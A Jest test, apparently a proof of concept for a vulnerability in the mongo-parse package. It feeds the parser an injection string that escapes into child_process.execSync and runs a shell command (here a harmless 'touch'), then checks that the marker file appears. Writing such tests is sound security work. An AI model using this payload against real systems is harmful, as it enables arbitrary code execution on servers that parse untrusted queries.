test("Arbitrary code execution in mongo-parse", (done) => {
  expect.assertions(2);
  const fs = require("fs");
  const parser = require("mongo-parse");
  const path = "./mongo-parse";
  
  try {
    if (fs.existsSync(path)) fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  
  try {
    let query = parser.parse(
      '} + clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync("touch mongo-parse") //'
    );
  } catch (error) {console.log(error)}
  
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
